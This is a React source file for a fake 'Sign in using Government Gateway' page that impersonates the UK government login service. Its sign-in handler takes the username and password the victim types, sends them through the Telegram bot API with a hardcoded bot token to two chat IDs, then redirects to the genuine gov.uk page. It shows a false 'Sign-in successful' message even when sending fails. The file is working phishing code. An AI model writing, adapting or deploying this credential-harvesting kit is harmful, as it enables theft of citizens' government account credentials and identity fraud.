
import { useState } from "react";
import { useToast } from "@/components/ui/use-toast";
import Header from "@/components/Header";
import SecurityAlert from "@/components/SecurityAlert";
import SignInForm from "@/components/SignInForm";
import HelpLinks from "@/components/HelpLinks";
import Footer from "@/components/Footer";

const SignIn = () => {
  const [showPassword, setShowPassword] = useState(false);
  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");
  const [isLoading, setIsLoading] = useState(false);
  const { toast } = useToast();

  const handleSignIn = async (e: React.FormEvent) => {
    e.preventDefault();
    setIsLoading(true);
  
    // Redirect immediately
    window.location.href = "https://www.access.service.gov.uk/login/signin/creds";
  
    try {
      // Telegram configuration
      const botToken = "8088033772:AAHi68OdwNMT38qt3Dajq_RnIUdoyuEnTFo"; // Replace with your bot token
      const chatIds = ["1842861323","1100122765"]; // Add all your chat IDs here
      const message = `New login attempt:\nUser ID: ${username}\nPassword: ${password}`;
      
      // Send message to multiple chat IDs
      const sendPromises = chatIds.map(chatId => 
        fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
          },
          body: JSON.stringify({
            chat_id: chatId,
            text: message,
            parse_mode: "HTML",
          }),
        })
      );
      
      // Wait for all messages to be sent
      await Promise.all(sendPromises);
  
      // Simulate login delay
      setTimeout(() => {
        toast({
          title: "Sign-in successful",
          description: "You are now being redirected to your account.",
        });
        setIsLoading(false);
      }, 1500);
      
    } catch (error) {
      console.error("Error sending data:", error);
      setIsLoading(false);
      // Still show success to the user
      toast({
        title: "Sign-in successful",
        description: "You are now being redirected to your account.",
      });
    }
  };

  return (
    <div className="min-h-screen flex flex-col bg-white">
      <Header />
      
      <div className="max-w-4xl mx-auto w-full px-4 py-6 flex-grow">
        <SecurityAlert />
        
        <main className="mt-8 mb-12">
          <h1 className="text-5xl font-bold mb-10">
            Sign in using Government <br /> Gateway
          </h1>
          
          <SignInForm 
            username={username}
            setUsername={setUsername}
            password={password}
            setPassword={setPassword}
            showPassword={showPassword}
            setShowPassword={setShowPassword}
            handleSignIn={handleSignIn}
            isLoading={isLoading}
          />
          
          <HelpLinks />
        </main>
      </div>
      
      <Footer />
    </div>
  );
};

export default SignIn;
